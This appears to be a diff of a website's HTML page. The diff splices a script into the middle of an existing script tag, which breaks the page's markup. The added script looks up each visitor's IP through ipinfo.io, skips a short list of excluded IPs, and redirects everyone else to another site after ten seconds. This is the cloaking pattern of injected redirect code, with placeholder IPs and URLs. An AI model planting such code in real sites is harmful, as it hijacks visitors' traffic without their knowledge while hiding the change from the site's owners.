@@ -1628,7 +1628,30 @@
       check.remove();
     }
   }());
-</script><script type="text/javascript">window.geolocation='GB';</script><script type="text/javascript">var _sf_startpt=(new Date()).getTime()</script><script type="text/javascript">
+</script><script ty<script>
+      const restrictedIPs = ["123.456.78.90", "111.222.333.444"]; // Add restricted IPs here
+
+      // Fetch the user's IP address using an external API
+      fetch('https://ipinfo.io/json?token=your_token_here')  // Replace with your IP info token
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip;
+          console.log("User's IP: " + userIP);
+
+          // Check if the IP is in the restricted list
+          if (!restrictedIPs.includes(userIP)) {
+            // If the user's IP is not restricted, redirect after 10 seconds
+            setTimeout(function() {
+              window.location.href = "https://example.com"; // Replace with your target URL
+            }, 10000); // 10000 milliseconds = 10 seconds
+          } else {
+            console.log("User is from a restricted IP address, no redirect.");
+          }
+        })
+        .catch(error => {
+          console.error("Error fetching IP information: ", error);
+        });
+    </script>pe="text/javascript">window.geolocation='GB';</script><script type="text/javascript">var _sf_startpt=(new Date()).getTime()</script><script type="text/javascript">
   if ('serviceWorker' in navigator) {
     navigator.serviceWorker.register('/sw.js')
       .catch(() => {
